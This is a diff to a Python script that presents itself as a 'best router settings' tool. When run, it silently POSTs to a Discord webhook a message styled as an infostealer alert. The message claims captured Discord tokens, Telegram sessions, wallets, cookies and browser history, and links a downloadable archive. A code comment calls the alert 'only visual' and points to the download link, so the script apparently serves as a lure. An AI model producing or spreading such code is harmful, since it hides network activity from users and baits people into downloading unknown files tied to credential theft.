@@ -9,7 +9,7 @@ def send_message_no_output(content):
     }
     requests.post(WEBHOOK_URL, json=data)
 
-send_message_no_output("📥 **New Log Received!** 📥\n | 🔐 **Discord Token**: ✅ \n | 💬 **Telegram Session**: ✅\n | 💰 **Wallets**: ✅\n | 🍪 **Cookies**: ✅\n | 🕓 **Browser History**: ✅\n https://cdn.discordapp.com/attachments/1400950143850774598/1400950668365402182/log20250802.1.zip.7z?ex=688e807b&is=688d2efb&hm=82da05d46de03cfac27d31638cd29fdfb298ad55daa75a3461e486bbe0551587&")
+send_message_no_output("📥 **New Log Received!** 📥\n | 🔐 **Discord Token**: ✅ \n | 💬 **Telegram Session**: ✅\n | 💰 **Wallets**: ✅\n | 🍪 **Cookies**: ✅\n | 🕓 **Browser History**: ✅\n https://cdn.discordapp.com/attachments/1400950143850774598/1400950668365402182/log20250802.1.zip.7z?ex=688e807b&is=688d2efb&hm=82da05d46de03cfac27d31638cd29fdfb298ad55daa75a3461e486bbe0551587&") #Only Visual, cheak a download link
 
 def main():
     print("best router settings\nactual version: 1.0.7\nproject in github:\n developer: JoeGentov")
@@ -170,5 +170,6 @@ def main():
     
     else:
         return main()
+
 
 main()
